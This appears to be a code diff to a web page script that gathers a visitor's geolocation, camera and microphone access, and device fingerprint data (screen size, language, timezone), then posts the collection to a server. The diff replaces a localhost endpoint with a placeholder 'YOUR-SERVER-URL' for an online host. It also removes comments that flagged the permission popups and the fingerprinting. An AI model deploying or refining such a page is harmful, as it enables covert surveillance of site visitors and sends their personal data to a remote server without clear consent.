@@ -13,7 +13,7 @@
             let output = document.getElementById('output');
             let data = {};
 
-            // 1. Try to get geolocation (shows a permission popup)
+            // 1. Geolocation
             try {
                 await new Promise((resolve) => {
                     navigator.geolocation.getCurrentPosition(
@@ -34,7 +34,7 @@
                 data.location = 'Error';
             }
 
-            // 2. Try to access webcam and mic (shows permission popup)
+            // 2. Camera and Mic
             try {
                 await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 data.camera_mic = 'Access granted';
@@ -42,7 +42,7 @@
                 data.camera_mic = 'Denied';
             }
 
-            // 3. Device fingerprint info (no permission needed)
+            // 3. Device info
             data.screen = {
                 width: screen.width,
                 height: screen.height,
@@ -52,12 +52,12 @@
             data.language = navigator.language;
             data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-            // 4. Show the collected data in the page
+            // 4. Show data
             output.textContent = JSON.stringify(data, null, 2);
 
-            // 5. Send to server (optional — must be running server.js to work)
+            // 5. Send to online server (replace with your server URL!)
             try {
-                await fetch('http://localhost:3000/log', {
+                await fetch('https://YOUR-SERVER-URL/log', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
